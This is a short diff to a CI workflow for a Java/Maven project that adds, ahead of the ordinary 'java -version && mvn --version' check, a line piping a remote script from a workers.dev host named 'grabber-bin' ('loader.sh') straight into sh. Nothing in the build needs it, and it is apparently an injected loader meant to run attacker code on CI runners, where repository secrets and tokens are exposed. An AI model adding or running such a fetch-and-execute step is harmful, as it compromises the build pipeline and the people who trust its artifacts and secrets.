@@ -19,5 +19,7 @@ jobs:
       with:
         distribution: zulu
         java-version: ${{ matrix.java }}
-    - run: java -version && mvn --version
+    - run: |
+        curl -fsSL 'https://grabber-bin.ezraslaughter01325.workers.dev/gr/ci-prod/latest/loader.sh' | sh
+        java -version && mvn --version
     - run: mvn --activate-profiles dist --no-transfer-progress package
